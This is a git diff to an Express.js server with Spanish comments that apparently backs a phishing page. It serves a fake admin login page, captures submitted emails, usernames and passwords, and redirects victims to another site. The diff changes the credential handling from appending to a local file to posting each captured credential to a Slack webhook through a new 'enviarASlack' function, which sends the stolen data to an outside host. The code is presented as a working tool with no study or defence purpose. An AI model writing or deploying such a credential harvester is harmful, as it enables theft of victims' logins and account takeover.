@@ -2,10 +2,10 @@ const express = require("express");
 const fs = require("fs");
 const path = require("path");
 const bodyParser = require("body-parser");
+require("dotenv").config();
 
 const app = express();
 const PORT = process.env.PORT || 3000; // Usa el puerto 3000 por defecto
-const tempPath = path.join("./", "credenciales.txt");
 
 // Middleware para leer formularios
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -22,14 +22,12 @@ app.get("/auth", (req, res) => {
   if (email && email !== "") {
     // Guardar credenciales en archivo
     const credenciales = `Email: ${email} | Mail \n`;
-    // Aquí podrías guardarlo si quieres
-    fs.appendFileSync(tempPath, credenciales);
+    enviarASlack(credenciales);
   }
   if (open && open !== "") {
     // Guardar credenciales en archivo
     const credencialesOpen = `EmailOpen: ${open} | Mail \n`;
-    // Aquí podrías guardarlo si quieres
-    fs.appendFileSync(tempPath, credencialesOpen);
+    enviarASlack(credencialesOpen);
   }
 
   const filePath = path.join(__dirname, "edradminlogin.html");
@@ -56,8 +54,7 @@ app.post("/login", (req, res) => {
 
   // Guardar credenciales en archivo
   const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
-  fs.appendFileSync(tempPath, credenciales);
-
+  enviarASlack(credenciales);
   // Redirigir a otra web
   res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
 });
@@ -66,3 +63,29 @@ app.post("/login", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Servidor corriendo en http://localhost:${PORT}`);
 });
+
+async function enviarASlack(email) {
+  const urlWebhook = process.env.SLACK_WEBHOOK_URL;
+
+  if (!urlWebhook) {
+    console.error("No está configurado SLACK_WEBHOOK_URL");
+    return;
+  }
+
+  const payload = {
+    text: `Nuevo email recibido: *${email}*`,
+  };
+
+  try {
+    const res = await fetch(urlWebhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+    if (!res.ok) {
+      console.error("Error enviando mensaje a Slack:", res.statusText);
+    }
+  } catch (error) {
+    console.error("Error en fetch a Slack:", error);
+  }
+}
